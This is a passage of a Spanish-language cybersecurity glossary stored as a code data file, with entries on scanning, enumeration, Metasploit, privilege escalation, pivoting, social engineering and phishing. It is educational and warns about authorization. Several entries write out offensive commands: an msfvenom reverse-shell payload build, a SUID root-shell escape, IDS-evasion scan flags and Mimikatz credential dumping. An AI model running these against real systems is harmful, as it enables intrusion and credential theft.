      "nmap --script vuln 10.0.0.5\n" +
      "> ⚠️ La categoría `vuln`/`exploit` es intrusiva: solo con autorización.",
    examples: [
      "nmap --script smb-enum-shares para listar shares SMB.",
      "nmap -sC ejecuta los scripts por defecto.",
    ],
    related: ["Tipos de escaneo Nmap", "Detección de servicio y OS", "Enumeración SMB y NetBIOS"],
  },
  {
    id: 292,
    module: 26,
    term: "Detección de servicio y OS",
    short: "Nmap identifica qué versión de servicio corre y qué sistema operativo es el host.",
    detail:
      "Con **-sV** Nmap hace *banner grabbing* y fingerprinting para deducir el **servicio y versión** de cada puerto; con **-O**, el **sistema operativo** por las peculiaridades de su pila TCP/IP. Saber la versión exacta es clave para buscar CVEs aplicables.",
    examples: [
      "nmap -sV revela 'Apache 2.4.49' (con CVE conocida).",
      "nmap -O estima Linux 5.x vs Windows Server.",
    ],
    related: ["Tipos de escaneo Nmap", "Análisis de vulnerabilidades", "CVE y CVSS"],
  },
  {
    id: 293,
    module: 26,
    term: "Evasión de IDS/firewall",
    short: "Técnicas para escanear sin disparar las defensas del objetivo.",
    detail:
      "Nmap ofrece opciones para evadir detección: **fragmentación** (`-f`), **timing lento** (`-T1/-T2`), **señuelos** (`-D`) que mezclan IPs falsas, y cambiar el **puerto de origen**.\n" +
      "nmap -sS -T2 -f -D RND:5 objetivo\n" +
      "> ⚠️ Ningún método es infalible contra un IDS moderno; reducen pero no eliminan la huella.",
    examples: [
      "-T2 para un escaneo lento que no destaca en los logs.",
      "-D para esconder la IP real entre señuelos.",
    ],
    related: ["Tipos de escaneo Nmap", "Detección de anomalías en tráfico", "Reconocimiento pasivo vs activo"],
  },

  // ── M27 · Enumeración de Servicios ───────────────────────────────────────
  {
    id: 300,
    module: 27,
    term: "Enumeración SMB y NetBIOS",
    short: "SMB suele filtrar shares, usuarios y políticas; un clásico punto de entrada.",
    detail:
      "**SMB** (puertos 445/139) es una mina de información en redes Windows: shares accesibles, usuarios, políticas de contraseña. Herramientas: **enum4linux**, **smbclient**, **crackmapexec**.\n" +
      "enum4linux -a 10.0.0.10\n" +
      "> ⚠️ Shares con **null session** (sin credenciales) son hallazgos frecuentes y graves.",
    examples: [
      "smbclient -L //10.0.0.10 lista los shares.",
      "crackmapexec smb para spray de credenciales en la red.",
    ],
    related: ["Herramientas de enumeración", "DNS zone transfer", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 301,
    module: 27,
    term: "DNS zone transfer",
    short: "Un servidor DNS mal configurado entrega todos sus registros de golpe.",
    detail:
      "Una **transferencia de zona (AXFR)** está pensada para replicar entre servidores DNS, pero si está abierta a cualquiera, revela **todo el mapa interno** (hostnames, IPs, subdominios).\n" +
      "dig axfr ejemplo.com @ns1.ejemplo.com\n" +
      "> 💡 Es de los primeros checks de enumeración: regala el inventario de la red.",
    examples: [
      "Un AXFR exitoso lista servidores internos no públicos.",
      "Mitigación: restringir AXFR a IPs de servidores secundarios.",
    ],
    related: ["DNS", "Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP"],
  },
  {
    id: 302,
    module: 27,
    term: "Enumeración SNMP y LDAP",
    short: "SNMP y LDAP exponen inventario de dispositivos y estructura del directorio.",
    detail:
      "• **SNMP** (UDP/161) con la *community string* por defecto (`public`) filtra interfaces, procesos y rutas.\n" +
      "• **LDAP** (389/636) permite enumerar usuarios, grupos y la estructura de Active Directory.\n" +
      "snmpwalk -v2c -c public 10.0.0.20\n" +
      "ldapsearch -x -h 10.0.0.10 -b \"dc=corp,dc=local\"",
    examples: [
      "snmpwalk con community 'public' lista la config del router.",
      "ldapsearch enumera cuentas del dominio.",
    ],
    related: ["Enumeración SMB y NetBIOS", "LDAP", "Herramientas de enumeración"],
  },
  {
    id: 303,
    module: 27,
    term: "Herramientas de enumeración",
    short: "enum4linux, rpcclient, gobuster, nikto: el arsenal para sonsacar servicios.",
    detail:
      "Cada protocolo tiene su herramienta:\n" +
      "• **enum4linux / rpcclient** — SMB/MSRPC (usuarios, shares).\n" +
      "• **gobuster / ffuf** — fuzzing de directorios y subdominios web.\n" +
      "• **nikto** — escáner de problemas web conocidos.\n" +
      "• **crackmapexec** — enumeración y spray en redes AD.\n" +
      "gobuster dir -u http://10.0.0.5 -w wordlist.txt",
    examples: [
      "gobuster descubriendo /admin oculto.",
      "rpcclient -U '' para una sesión nula contra SMB.",
    ],
    related: ["Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP", "Análisis de vulnerabilidades"],
  },

  // ── M28 · Análisis de Vulnerabilidades ───────────────────────────────────
  {
    id: 310,
    module: 28,
    term: "Escáneres de vulnerabilidades",
    short: "Nessus, OpenVAS y nuclei automatizan la detección de fallos conocidos.",
    detail:
      "Un **escáner de vulnerabilidades** compara servicios/versiones contra bases de CVEs:\n" +
      "| Herramienta | Nota |\n" +
      "|---|---|\n" +
      "| Nessus | Comercial, muy completo |\n" +
      "| OpenVAS | Open source |\n" +
      "| nuclei | Basado en plantillas, rápido, CI-friendly |\n" +
      "> ⚠️ Generan **falsos positivos**: hay que validar manualmente antes de reportar.",
    examples: [
      "nuclei -u https://target con plantillas comunitarias.",
      "Un escaneo Nessus autenticado para mayor profundidad.",
    ],
    related: ["CVE y CVSS", "Análisis de vulnerabilidades", "Detección de servicio y OS"],
  },
  {
    id: 311,
    module: 28,
    term: "Análisis de vulnerabilidades",
    short: "No es solo escanear: es validar, contextualizar y priorizar los hallazgos.",
    detail:
      "Un **vulnerability assessment** identifica y clasifica debilidades, pero a diferencia de un **pentest** no necesariamente las explota. El valor está en **validar** (descartar falsos positivos), **contextualizar** (¿es alcanzable? ¿qué expone?) y **priorizar** la remediación.",
    examples: [
      "Confirmar manualmente que una vuln reportada es real.",
      "Diferenciar un assessment (amplio) de un pentest (profundo).",
    ],
    related: ["Escáneres de vulnerabilidades", "Priorización de remediación", "Gestión de riesgos"],
  },
  {
    id: 312,
    module: 28,
    term: "Priorización de remediación",
    short: "Arreglar primero lo crítico y explotable, no todo a la vez.",
    detail:
      "No todo se parchea a la vez. Se prioriza combinando **CVSS** (severidad), **explotabilidad real** (¿hay exploit público? ¿está en la **CISA KEV**?) y **exposición/contexto** (¿es alcanzable desde Internet?).\n" +
      "> 💡 Una CVSS 9.8 expuesta a Internet y en KEV va primero que una 9.0 interna sin exploit conocido.",
    examples: [
      "Priorizar una CVE en la lista KEV de CISA.",
      "Posponer una vuln alta pero inalcanzable tras la red interna.",
    ],
    related: ["CVE y CVSS", "Análisis de vulnerabilidades", "Gestión de riesgos"],
  },
  {
    id: 313,
    module: 28,
    term: "Assessment vs pentest",
    short: "El assessment lista y prioriza vulnerabilidades; el pentest las explota para demostrar impacto.",
    detail:
      "Dos servicios que se confunden:\n" +
      "• **Vulnerability assessment** — amplio, automatizado, sin explotar; responde '¿qué fallos tengo?'.\n" +
      "• **Penetration test** — profundo, manual, explota y encadena; responde '¿qué puede lograr un atacante real?'.\n" +
      "Un **red team** va más allá: simula un adversario con objetivos y sigilo.",
    examples: [
      "Assessment trimestral + pentest anual como combinación típica.",
      "Un pentest demuestra el impacto encadenando vulnerabilidades.",
    ],
    related: ["Análisis de vulnerabilidades"],
  },

  // ── M29 · Metasploit Framework ───────────────────────────────────────────
  {
    id: 320,
    module: 29,
    term: "Arquitectura de Metasploit",
    short: "El framework organiza exploits, payloads y módulos auxiliares bajo msfconsole.",
    detail:
      "**Metasploit** es el framework de explotación de referencia. Sus piezas:\n" +
      "• **Exploit** — código que aprovecha una vulnerabilidad.\n" +
      "• **Payload** — lo que se ejecuta tras explotar (shell, Meterpreter).\n" +
      "• **Auxiliary** — escáneres, fuzzers, módulos sin payload.\n" +
      "• **Encoder / NOP** — para evasión.\n" +
      "Todo se maneja desde **msfconsole**.",
    examples: [
      "search type:exploit smb para encontrar módulos.",
      "Un módulo auxiliary para hacer brute force de SSH.",
    ],
    related: ["Payloads y Meterpreter", "Exploit y Payload"],
  },
  {
    id: 321,
    module: 29,
    term: "Payloads y Meterpreter",
    short: "El payload es lo que corre tras el exploit; Meterpreter es el más potente.",
    detail:
      "Los payloads pueden ser **staged** (se envían en partes, más sigilosos) o **stageless** (un solo bloque). **Meterpreter** es un payload avanzado en memoria que ofrece migración de procesos, captura de teclas, pivoting y más, sin tocar disco.\n" +
      "> 💡 `windows/x64/meterpreter/reverse_tcp` es un payload staged clásico.",
    examples: [
      "getsystem en Meterpreter intenta escalar a SYSTEM.",
      "migrate para moverse a un proceso más estable.",
    ],
    related: ["Arquitectura de Metasploit", "Post-explotación", "Exploit y Payload"],
  },
  {
    id: 322,
    module: 29,
    term: "Post-explotación",
    short: "Lo que se hace tras ganar acceso: persistir, recolectar y pivotar.",
    detail:
      "Conseguir una shell es el principio. La **post-explotación** abarca: **escalar privilegios**, **recolectar credenciales/datos**, **mantener persistencia** y **pivotar** hacia otras máquinas. Es donde se materializa el impacto real de un compromiso.",
    examples: [
      "Volcar hashes con hashdump tras escalar.",
      "Usar la máquina comprometida como pivote a la red interna.",
    ],
    related: ["Payloads y Meterpreter", "Movimiento lateral"],
  },
  {
    id: 323,
    module: 29,
    term: "msfvenom",
    short: "El generador de payloads independientes de Metasploit.",
    detail:
      "**msfvenom** crea payloads autónomos (ejecutables, scripts, shellcode) para usar fuera de un exploit de Metasploit, con codificación opcional para evasión.\n" +
      "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe\n" +
      "> ⚠️ Los payloads sin ofuscar los detecta cualquier AV moderno.",
    examples: [
      "Generar un .exe con reverse shell para un laboratorio.",
      "Crear shellcode para inyectar en un exploit propio.",
    ],
    related: ["Payloads y Meterpreter", "Arquitectura de Metasploit", "PowerShell ofensivo"],
  },

  // ── M30 · Burp Suite ─────────────────────────────────────────────────────
  {
    id: 330,
    module: 30,
    term: "Proxy e intercept",
    short: "Burp se sitúa entre el navegador y el servidor para ver y modificar cada petición.",
    detail:
      "El corazón de **Burp Suite** es su **proxy**: configurando el navegador para pasar por Burp, se **interceptan**, inspeccionan y **modifican** las peticiones HTTP/S al vuelo. Es la base de todo testing web manual.\n" +
      "> 💡 Requiere instalar el certificado CA de Burp en el navegador para ver el tráfico HTTPS.",
    examples: [
      "Interceptar un POST de login y alterar parámetros.",
      "Ver el tráfico oculto que hace el JavaScript de una SPA.",
    ],
    related: ["Repeater", "Intruder", "Scanner y extensiones"],
  },
  {
    id: 331,
    module: 30,
    term: "Repeater",
    short: "Reenvía y modifica una petición manualmente cuantas veces haga falta.",
    detail:
      "**Repeater** permite tomar una petición, **editarla y reenviarla** repetidamente para probar manualmente cómo responde el servidor. Es la herramienta clave para explorar vulnerabilidades (probar payloads de SQLi/XSS, manipular tokens) con precisión.",
    examples: [
      "Probar distintos payloads de SQLi en un parámetro.",
      "Manipular un id para verificar un IDOR.",
    ],
    related: ["Proxy e intercept", "Intruder", "SQL Injection"],
  },
  {
    id: 332,
    module: 30,
    term: "Intruder",
    short: "Automatiza el envío de muchas peticiones con payloads variables (fuzzing, brute force).",
    detail:
      "**Intruder** automatiza ataques sobre posiciones marcadas de una petición: **fuzzing** de parámetros, **fuerza bruta** de credenciales, enumeración. Define payloads y analiza las respuestas (longitud, código) para detectar anomalías.\n" +
      "> 💡 La versión Community de Burp limita la velocidad de Intruder; las Pro no.",
    examples: [
      "Brute force de un login con una lista de contraseñas.",
      "Fuzzear un parámetro para descubrir valores válidos.",
    ],
    related: ["Repeater", "Proxy e intercept", "Identification and Authentication Failures"],
  },
  {
    id: 333,
    module: 30,
    term: "Scanner y extensiones",
    short: "El escáner automático de Burp Pro y el ecosistema de extensiones BApp.",
    detail:
      "Burp **Pro** incluye un **Scanner** que detecta automáticamente vulnerabilidades comunes (XSS, SQLi, etc.). El **BApp Store** añade extensiones (Logger++, Autorize para IDOR, Active Scan++) que potencian el flujo. La filosofía: automatizar lo repetitivo, validar a mano lo crítico.",
    examples: [
      "Autorize para detectar fallos de control de acceso.",
      "Active Scan++ para ampliar la cobertura del scanner.",
    ],
    related: ["Proxy e intercept", "Escáneres de vulnerabilidades", "OWASP Top 10"],
  },

  // ── M31 · Escalada de Privilegios: Linux ─────────────────────────────────
  {
    id: 340,
    module: 31,
    term: "Enumeración local (LinPEAS)",
    short: "El primer paso de la escalada: mapear el sistema en busca de vectores.",
    detail:
      "Antes de escalar hay que **enumerar** el sistema: versión del kernel, binarios SUID, permisos sudo, tareas cron, archivos world-writable, credenciales. Herramientas como **LinPEAS** y **LinEnum** automatizan este barrido y resaltan los hallazgos.\n" +
      "sudo -l\n" +
      "find / -perm -4000 2>/dev/null",
    examples: [
      "Ejecutar LinPEAS y revisar lo marcado en rojo/amarillo.",
      "sudo -l para ver qué se puede correr como root.",
    ],
    related: ["SUID/SGID abuse", "Sudo, cron y PATH hijacking", "Bits especiales SUID/SGID/sticky"],
  },
  {
    id: 341,
    module: 31,
    term: "SUID/SGID abuse",
    short: "Binarios SUID mal elegidos permiten ejecutar como root.",
    detail:
      "Un binario **SUID root** corre con privilegios de root sin importar quién lo lance. Si es un binario que permite ejecutar comandos o leer archivos (ej. `find`, `vim`, `nmap` viejo), se abusa para escalar. **GTFOBins** cataloga cómo explotar cada uno.\n" +
      "find . -exec /bin/sh -p \\; -quit\n" +
      "> 💡 GTFOBins es la referencia para 'romper' un binario SUID/sudo concreto.",
    examples: [
      "Un find SUID que lanza una shell de root.",
      "Consultar GTFOBins para el binario SUID hallado.",
    ],
    related: ["Enumeración local (LinPEAS)", "Bits especiales SUID/SGID/sticky", "Sudo, cron y PATH hijacking"],
  },
  {
    id: 342,
    module: 31,
    term: "Sudo, cron y PATH hijacking",
    short: "Reglas sudo laxas, cron jobs y un PATH manipulable abren caminos a root.",
    detail:
      "Vectores muy comunes:\n" +
      "• **sudo** mal configurado — un comando permitido que se 'rompe' (GTFOBins) o `NOPASSWD` amplio.\n" +
      "• **cron jobs** — tareas de root que ejecutan scripts modificables o con comodines.\n" +
      "• **PATH hijacking** — si un script privilegiado llama a un binario sin ruta absoluta, se coloca uno malicioso antes en el PATH.",
    examples: [
      "Un cron de root corriendo un script world-writable.",
      "Inyectar un binario falso en el PATH de un script SUID.",
    ],
    related: ["SUID/SGID abuse", "Enumeración local (LinPEAS)", "Kernel exploits y capabilities"],
  },
  {
    id: 343,
    module: 31,
    term: "Kernel exploits y capabilities",
    short: "Un kernel viejo o capabilities mal asignadas también dan root.",
    detail:
      "• **Kernel exploits** — un kernel sin parchear puede tener una vuln de escalada local (ej. Dirty COW, Dirty Pipe). Potentes pero arriesgados (pueden tumbar el sistema).\n" +
      "• **Capabilities** — permisos granulares de Linux; una mal asignada (ej. `cap_setuid` en un binario) equivale a root.\n" +
      "getcap -r / 2>/dev/null",
    examples: [
      "Dirty Pipe (2022) para escalar en kernels vulnerables.",
      "Un Python con cap_setuid+ep que da una shell de root.",
    ],
    related: ["Sudo, cron y PATH hijacking", "Vulnerable and Outdated Components", "Enumeración local (LinPEAS)"],
  },

  // ── M32 · Escalada de Privilegios: Windows ───────────────────────────────
  {
    id: 350,
    module: 32,
    term: "Enumeración (WinPEAS/PowerUp)",
    short: "Mapear el host Windows en busca de misconfiguraciones que escalen a SYSTEM.",
    detail:
      "Como en Linux, la escalada empieza enumerando: privilegios del token, servicios, parches faltantes, credenciales guardadas. **WinPEAS** (y **PowerUp** en PowerShell) automatizan la búsqueda de vectores.\n" +
      "whoami /priv\n" +
      "> 💡 `whoami /priv` revela privilegios abusables como SeImpersonatePrivilege (puerta a los ataques Potato).",
    examples: [
      "WinPEAS resaltando un servicio con permisos débiles.",
      "PowerUp's Invoke-AllChecks para un barrido rápido.",
    ],
    related: ["Token impersonation y Potato", "Servicios vulnerables", "Defender, AMSI y ETW"],
  },
  {
    id: 351,
    module: 32,
    term: "Token impersonation y Potato",
    short: "Abusar de SeImpersonatePrivilege para suplantar el token de SYSTEM.",
    detail:
      "Si una cuenta de servicio tiene **SeImpersonatePrivilege**, la familia de ataques **Potato** (JuicyPotato, RoguePotato, PrintSpoofer) la usa para **suplantar el token de SYSTEM** y escalar. Es uno de los caminos más comunes desde un servicio web/SQL comprometido.",
    examples: [
      "PrintSpoofer convirtiendo SeImpersonate en SYSTEM.",
      "JuicyPotato en versiones de Windows más antiguas.",
    ],
    related: ["Enumeración (WinPEAS/PowerUp)", "Servicios vulnerables", "Servicios y procesos"],
  },
  {
    id: 352,
    module: 32,
    term: "Servicios vulnerables",
    short: "Rutas sin comillas, permisos débiles y AlwaysInstallElevated permiten escalar.",
    detail:
      "Misconfiguraciones de servicios muy explotadas:\n" +
      "• **Unquoted service path** — una ruta con espacios sin comillas permite colocar un binario malicioso que se ejecuta como SYSTEM.\n" +
      "• **Permisos débiles** — poder modificar el binario o la config de un servicio.\n" +
      "• **AlwaysInstallElevated** — instala MSIs como SYSTEM.\n" +
      "• **DLL hijacking** — colocar una DLL que el servicio carga.",
    examples: [
      "C:\\Program Files\\app vuln.exe → plantar 'Program.exe'.",
      "AlwaysInstallElevated habilitado → MSI malicioso como SYSTEM.",
    ],
    related: ["Token impersonation y Potato", "Enumeración (WinPEAS/PowerUp)", "Servicios y procesos"],
  },
  {
    id: 353,
    module: 32,
    term: "Mimikatz y robo de credenciales",
    short: "Volcar contraseñas, hashes y tickets de la memoria de Windows.",
    detail:
      "Tras escalar a admin/SYSTEM, **Mimikatz** vuelca credenciales de la memoria de **LSASS**: contraseñas en claro, hashes NTLM y tickets Kerberos. Habilita **Pass-the-Hash** y **Golden Ticket** para el movimiento lateral.\n" +
      "> 💡 **Credential Guard** y proteger LSASS dificultan estos volcados.",
    examples: [
      "sekurlsa::logonpasswords para volcar credenciales.",
      "Robar un hash NTLM para Pass-the-Hash a otra máquina.",
    ],
    related: ["Token impersonation y Potato", "Ataques a Active Directory", "Movimiento lateral"],
  },

  // ── M33 · Pivoting y Movimiento Lateral ──────────────────────────────────
  {
    id: 360,
    module: 33,
    term: "Port forwarding y túneles",
    short: "Redirigir puertos a través de una máquina comprometida para alcanzar la red interna.",
    detail:
      "El **port forwarding** usa un host comprometido como **puente** hacia servicios internos no accesibles directamente. Con **SSH** se hacen túneles **local** (`-L`), **remoto** (`-R`) y **dinámico/SOCKS** (`-D`).\n" +
      "ssh -L 8080:10.0.0.50:80 user@pivote\n" +
      "> 💡 El túnel dinámico (-D) + proxychains permite enrutar herramientas enteras por el pivote.",
    examples: [
      "Acceder a una intranet 10.x vía un -L a través del pivote.",
      "ssh -D 1080 + proxychains nmap para escanear la red interna.",
    ],
    related: ["Túneles con chisel y ligolo", "Movimiento lateral", "Streams y redirección"],
  },
  {
    id: 361,
    module: 33,
    term: "Túneles con chisel y ligolo",
    short: "Herramientas modernas para tunelizar cuando no hay SSH disponible.",
    detail:
      "Cuando el pivote no tiene SSH (típico en Windows), se usan herramientas dedicadas:\n" +
      "• **chisel** — túnel TCP/UDP sobre HTTP, cliente-servidor.\n" +
      "• **ligolo-ng** — crea una interfaz de red hacia la red interna, muy cómodo.\n" +
      "• **sshuttle** — 'VPN pobre' sobre SSH para subredes enteras.\n" +
      "> 💡 ligolo-ng evita el dolor de cadenas de port-forwards manuales.",
    examples: [
      "chisel para tunelizar desde un Windows comprometido.",
      "ligolo-ng para enrutar toda una subred interna.",
    ],
    related: ["Port forwarding y túneles", "Movimiento lateral", "VPN: IPSec vs WireGuard"],
  },
  {
    id: 362,
    module: 33,
    term: "Movimiento lateral",
    short: "Saltar de una máquina a otra dentro de la red usando credenciales y protocolos legítimos.",
    detail:
      "El **movimiento lateral** expande el compromiso por la red usando técnicas que abusan de funciones legítimas: **PsExec**, **WMI**, **WinRM**, **RDP** y **Pass-the-Hash** (autenticarse con el hash sin la contraseña). El objetivo final suele ser el **Domain Admin** / Domain Controller.",
    examples: [
      "psexec.py con un hash robado para una shell en otro host.",
      "WinRM (evil-winrm) para moverse con credenciales válidas.",
    ],
    related: ["Túneles con chisel y ligolo", "Mimikatz y robo de credenciales", "Ataques a Active Directory"],
  },
  {
    id: 363,
    module: 33,
    term: "Defensa contra el movimiento lateral",
    short: "Segmentación, mínimo privilegio y monitoreo contienen al atacante interno.",
    detail:
      "Una vez dentro, el atacante busca expandirse; las defensas lo **contienen**:\n" +
      "• **Microsegmentación** — separar la red para que un host no llegue a todos.\n" +
      "• **Mínimo privilegio + LAPS** — limitar dónde sirve una credencial robada.\n" +
      "• **Deshabilitar SMBv1 / restringir RDP** — cerrar vías clásicas.\n" +
      "• **Monitoreo** — detectar uso anómalo de cuentas y herramientas (PsExec).",
    examples: [
      "Segmentar para que un PC de oficina no alcance los servidores.",
      "LAPS para que cada equipo tenga una contraseña local distinta.",
    ],
    related: ["Movimiento lateral", "Defensa en profundidad", "DMZ y segmentación de red"],
  },

  // ── M34 · Ingeniería Social ──────────────────────────────────────────────
  {
    id: 370,
    module: 34,
    term: "Ingeniería social",
    short: "El 'hackeo humano': manipular a las personas para que rompan la seguridad.",
    detail:
      "La **ingeniería social** explota la psicología en vez de la tecnología: engaña a las personas para que revelen información, hagan clic o concedan acceso. Es el vector de **la mayoría de las brechas**, porque las personas suelen ser más fáciles de manipular que los sistemas de parchear.\n" +
      "> 💡 Por eso la **concienciación** del personal es uno de los controles con mejor relación coste/beneficio.",
    examples: [
      "Una llamada haciéndose pasar por soporte técnico para pedir la contraseña.",
      "Un correo urgente del 'CEO' pidiendo una transferencia.",
    ],
    related: ["Los 6 principios de Cialdini", "Pretexting", "Anatomía de un phishing"],
  },
  {
    id: 371,
    module: 34,
    term: "Los 6 principios de Cialdini",
    short: "Los gatillos psicológicos de la persuasión que todo ingeniero social explota.",
    detail:
      "Robert Cialdini identificó **6 principios** de influencia; el atacante los usa como ganchos:\n" +
      "| Principio | Gancho que explota |\n" +
      "|---|---|\n" +
      "| Reciprocidad | Devolver un favor recibido |\n" +
      "| Compromiso/coherencia | Ser consistente con lo ya dicho |\n" +
      "| Prueba social | Hacer lo que hacen los demás |\n" +
      "| Autoridad | Obedecer a una figura de poder |\n" +
      "| Simpatía | Confiar en quien nos cae bien |\n" +
      "| Escasez | Actuar por miedo a perder algo |\n" +
      "> 💡 Ver el diagrama 'Los 6 principios de Cialdini' más abajo con la defensa de cada uno.",
    examples: [
      "Autoridad: un correo del 'director de IT' exigiendo acción.",
      "Escasez: 'tu cuenta se cerrará en 24 h, verifica ya'.",
    ],
    related: ["Ingeniería social", "Pretexting", "Anatomía de un phishing"],
  },
  {
    id: 372,
    module: 34,
    term: "Pretexting",
    short: "Inventar un escenario creíble (un pretexto) para ganarse la confianza y sonsacar datos.",
    detail:
      "El **pretexting** construye una **historia falsa** y una identidad (soporte técnico, banco, auditor) para que la víctima coopere. A diferencia del phishing oportunista, es **dirigido y elaborado**, apoyado en OSINT previo para sonar legítimo.",
    examples: [
      "Hacerse pasar por el proveedor de internet para 'verificar' la red.",
      "Fingir ser un empleado nuevo que necesita acceso 'urgente'.",
    ],
    related: ["Ingeniería social", "Vishing y smishing", "Los 6 principios de Cialdini"],
  },
  {
    id: 373,
    module: 34,
    term: "Baiting, tailgating y dumpster diving",
    short: "Técnicas que combinan cebo, acceso físico y basura para comprometer a la víctima.",
    detail:
      "Tres técnicas clásicas, varias con componente **físico**:\n" +
      "• **Baiting** — dejar un cebo (un USB 'perdido' con malware) para que alguien lo conecte por curiosidad.\n" +
      "• **Tailgating** (*piggybacking*) — colarse a una zona restringida siguiendo a alguien con acceso.\n" +
      "• **Dumpster diving** — buscar información sensible en la basura (papeles, discos).",
    examples: [
      "Un USB con etiqueta 'Salarios 2024' abandonado en el parking.",
      "Entrar tras un empleado cargando cajas para que te abra la puerta.",
    ],
    related: ["Ingeniería social", "Pretexting", "Reconocimiento pasivo vs activo"],
  },
  {
    id: 374,
    module: 34,
    term: "Vishing y smishing",
    short: "Ingeniería social por canales de voz (vishing) y SMS (smishing).",
    detail:
      "El engaño no vive solo en el correo:\n" +
      "• **Vishing** — *voice phishing*: llamadas que suplantan al banco, soporte o un directivo (hoy potenciado con **clonación de voz por IA**).\n" +
      "• **Smishing** — *SMS phishing*: mensajes con enlaces maliciosos (falsa entrega de paquete, alerta bancaria).\n" +
      "> ⚠️ El **hackeo de Twitter (2020)** empezó con un **vishing** a empleados.",
    examples: [
      "Una llamada 'del banco' pidiendo el código de verificación.",
      "Un SMS de 'tu paquete está retenido, paga aquí'.",
    ],
    related: ["Pretexting", "Ingeniería social", "Anatomía de un phishing"],
  },
  {
    id: 375,
    module: 34,
    term: "SET (Social-Engineer Toolkit)",
    short: "El framework de referencia para automatizar ataques de ingeniería social.",
    detail:
      "El **SET** (*Social-Engineer Toolkit*) automatiza vectores de ingeniería social: **clonado de páginas** de login para robo de credenciales, generación de payloads, campañas de spear phishing. Es una herramienta de **red team / concienciación** autorizada.\n" +
      "> ⚠️ Como toda herramienta ofensiva: solo con autorización explícita.",
    examples: [
      "Clonar un portal de login para una prueba de phishing interna.",
      "Generar un vector de ataque para una campaña de awareness.",
    ],
    related: ["Ingeniería social", "GoPhish y campañas controladas", "Anatomía de un phishing"],
  },

  // ── M35 · Phishing Avanzado ──────────────────────────────────────────────
  {
    id: 380,
    module: 35,
    term: "Anatomía de un phishing",
    short: "Las señales que delatan un correo fraudulento, capa por capa.",
    detail:
      "Un phishing combina **pretexto + urgencia + un enlace/adjunto**. Señales de alerta:\n" +
      "| Señal | Ejemplo |\n" +
      "|---|---|\n" +
      "| Remitente sospechoso | Dominio parecido pero no idéntico |\n" +
      "| Urgencia/amenaza | 'Tu cuenta será suspendida' |\n" +
      "| Enlace engañoso | El texto dice una URL, apunta a otra |\n" +
      "| Adjunto inesperado | Factura.zip / .html |\n" +
      "> 💡 Pasar el cursor sobre el enlace (sin hacer clic) revela el destino real.",
    examples: [
      "Un 'reset de contraseña' que enlaza a un dominio lookalike.",
      "Un adjunto HTML que abre un portal de login falso local.",
    ],
    related: ["Spear phishing y whaling", "Evasión de filtros", "Los 6 principios de Cialdini"],
  },
  {
    id: 381,
    module: 35,
    term: "Spear phishing y whaling",
    short: "Phishing dirigido a una persona concreta (spear) o a un alto directivo (whaling).",
    detail:
      "Frente al phishing masivo, el **dirigido** es mucho más efectivo:\n" +
      "• **Spear phishing** — personalizado con OSINT (nombre, rol, proyectos) para una víctima específica.\n" +
      "• **Whaling** — *spear phishing* contra un 'pez gordo' (CEO, CFO), donde el premio es máximo.\n" +
      "> ⚠️ El compromiso de **RSA (2011)** comenzó con un spear phishing con un Excel malicioso.",
    examples: [
      "Un correo al CFO que cita un trato real de la empresa (whaling).",
      "Spear phishing a un admin de sistemas citando su última conferencia.",
    ],
    related: ["Anatomía de un phishing", "BEC (Business Email Compromise)", "Frameworks OSINT"],
  },
  {
    id: 382,
    module: 35,
    term: "BEC (Business Email Compromise)",
    short: "Fraude que suplanta a un ejecutivo o proveedor para desviar pagos.",
    detail:
      "El **BEC** suplanta (o compromete) la cuenta de un directivo o proveedor para ordenar **transferencias** o cambiar datos bancarios. No suele llevar malware —solo texto convincente y urgencia— lo que lo hace difícil de filtrar. Es de los fraudes **más costosos** según el FBI.",
    examples: [
      "Un 'CEO' pidiendo una transferencia urgente y confidencial.",
      "Un 'proveedor' que avisa de un cambio en su número de cuenta.",
    ],
    related: ["Spear phishing y whaling", "Anatomía de un phishing", "Ingeniería social"],
  },
  {
    id: 383,
    module: 35,
    term: "GoPhish y campañas controladas",
    short: "Plataforma para lanzar simulacros de phishing y medir la concienciación.",
    detail:
      "**GoPhish** es un framework open source para **campañas de phishing autorizadas** (awareness/red team): diseña plantillas, envía a grupos y mide quién abrió, hizo clic o entregó credenciales. Convierte la concienciación en **métricas accionables**.\n" +
      "> 💡 Un programa de awareness mide la tasa de clic a lo largo del tiempo para ver si baja con la formación.",
    examples: [
      "Un simulacro trimestral que reporta el % de clics por departamento.",
      "Plantillas que imitan al proveedor de correo de la empresa.",
    ],
    related: ["SET (Social-Engineer Toolkit)", "Anatomía de un phishing", "Defensas anti-phishing"],
  },
  {
    id: 384,
    module: 35,
    term: "Evasión de filtros",
    short: "Trucos para que el correo malicioso llegue a la bandeja de entrada.",
    detail:
      "Para sortear los filtros, los atacantes usan: **dominios lookalike** (rnicrosoft.com), **typosquatting**, redirecciones y acortadores, payloads en **HTML/QR** en vez de enlaces, y abusar de servicios legítimos (Google Forms). También intentan pasar **SPF/DKIM/DMARC** usando dominios recién registrados o mal protegidos.\n" +
      "> 💡 Defensa: **DMARC** en modo *reject* corta la suplantación de tu dominio.",
    examples: [
      "Usar rnicrosoft.com (rn≈m) para imitar microsoft.com.",
      "Un QR en el cuerpo que lleva al portal falso (quishing).",
    ],
    related: ["Defensas anti-phishing", "Anatomía de un phishing", "DNS"],
  },
  {
    id: 385,
    module: 35,
    term: "Defensas anti-phishing",
    short: "Capas técnicas y humanas que reducen el éxito del phishing.",
    detail:
      "Ninguna capa basta sola; se combinan:\n" +
      "• **Autenticación de correo** — SPF, DKIM y **DMARC** (reject) contra la suplantación.\n" +
      "• **MFA** — limita el daño de una credencial robada (idealmente resistente a phishing, FIDO2).\n" +
      "• **Filtrado** — gateways de correo, sandboxing de adjuntos, reescritura de URLs.\n" +
      "• **Concienciación** — formación y simulacros (GoPhish).\n" +
      "> ✅ La **MFA FIDO2/passkeys** es resistente al phishing porque está ligada al dominio.",
    examples: [
      "DMARC en reject + MFA en todas las cuentas.",
      "Botón 'reportar phishing' que alimenta al SOC.",
    ],
    related: ["Evasión de filtros", "GoPhish y campañas controladas", "Headers de seguridad"],
  },

  // ── M36 · Malware Analysis: Fundamentos ──────────────────────────────────
  {
    id: 390,
    module: 36,
    term: "Clasificación de malware",
    short: "El malware se categoriza por cómo se propaga y qué hace.",
    detail:
      "**Malware** = software malicioso. Tipos principales:\n" +
      "| Tipo | Característica |\n" +
      "|---|---|\n" +
